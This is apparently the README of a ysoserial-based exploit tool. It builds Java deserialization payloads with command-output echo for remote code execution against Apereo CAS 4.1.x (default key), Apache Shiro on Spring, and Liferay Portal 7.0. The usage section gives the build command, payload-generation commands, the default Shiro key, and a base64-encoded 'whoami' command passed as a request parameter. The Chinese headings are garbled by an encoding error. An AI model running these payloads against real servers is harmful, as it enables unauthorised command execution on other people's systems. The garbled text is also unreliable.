# ����ĳЩ��ܺͳ����µķ����л����� 

## 0x01 Introduce

1. Request/Response����
2. ֧��win��linux payload
2. base64����

## 0x02 Support
1. ApereoCAS 4.1.X Ĭ����Կ
2. Shiro spring �����»���
3. Liferay protal 7.0 ����

## 0x02 Buiding

```mvn clean package -DskipTests```

## 0x03 Usage

```
Usage: java -jar yso-echo-all.jar [payload] win
Usage: java -jar yso-echo-all.jar [payload] linux

Usage: java -jar yso-echo-all.jar shiro_CommonsBeanutils1 win [key default kPH+bIxk5D2deZiIxcaaaA==]
Usage: java -jar yso-echo-all.jar shiro_CommonsBeanutils1 win kPH+bIxk5D2deZiIxcaaaA==
Usage: java -jar yso-echo-all.jar liferay_CommonsBeanutils1 linux
Usage: java -jar yso-echo-all.jar apereo_CommonsCollections2 linux

[Add Request get/post parameter] c=d2hvYW1p (whoami)
```

## 0x04 Screenshot
![shiro_spring_env.png](./screenshot/shiro_spring_env.png)

## 0x05 Reference
* https://github.com/frohoff/ysoserial
* https://www.freebuf.com/vuls/226149.html
* https://www.00theway.org/2020/01/04/apereo-cas-rce/